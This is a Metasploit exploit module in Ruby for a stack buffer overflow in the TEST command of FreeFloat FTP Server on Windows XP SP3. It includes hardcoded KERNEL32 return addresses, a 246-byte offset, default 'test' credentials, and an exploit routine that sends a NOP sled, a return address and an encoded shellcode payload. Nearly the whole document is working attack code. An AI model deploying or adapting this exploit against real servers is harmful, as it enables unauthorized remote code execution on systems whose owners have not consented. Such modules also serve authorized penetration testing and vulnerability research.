require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
    include Msf::Exploit::Remote::Ftp
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'FreeFloat FTP Server TEST Buffer Overflow',
            'Description'    => %q{
                        This module exploits a FreeFloat FTP Server Buffer Overflow
                        found in the TEST command.
            },
            'Author'         => [
                        'KaHPeSeSe'     #Found bug and wrote the exploit
                    ],
            'License'        => MSF_LICENSE,
            'Version'        => "$Revision: 14774 $",
            'References'     =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/17546' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/17548' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/17550' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload'        =>
                {
                    'BadChars' => "\x00\x0a\x0d",
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ 'PERFECT XP PC1 / SP3 # jmp esp',
                        {
                            'Ret' => 0x7C86467B, # findjmp KERNEL32.DLL ESP 0x7C86467B jmp ESP
                            'Offset' => 246
                        }
                    ],
          
          [ 'PERFECT XP PC1 / SP3 # push esp - ret',
                        {
                            'Ret' => 0x7C909DB0, # findjmp KERNEL32.DLL ESP 0x7C909DB0 push esp - ret
                            'Offset' => 246
                        }
                    ],
                ],
            'DisclosureDate' => 'March 13 2012',
            'DefaultTarget' => 0))
      
      register_options(
      [
        Opt::RPORT(21),
        OptString.new('FTPUSER', [ false, 'The username to authenticate as', 'test']),
        OptString.new('FTPPASS', [ false, 'The password to authenticate with', 'test'])
      ], self.class )
  end
  
    def exploit
        connect_login
        print_status("Trying target #{target.name}...")
        buf = make_nops(target['Offset']) + [target.ret].pack('V')
        buf << make_nops(20)
        buf << payload.encoded
        send_cmd( ['TEST', buf] , false )   #TEST command
        handler
        disconnect
    end
end
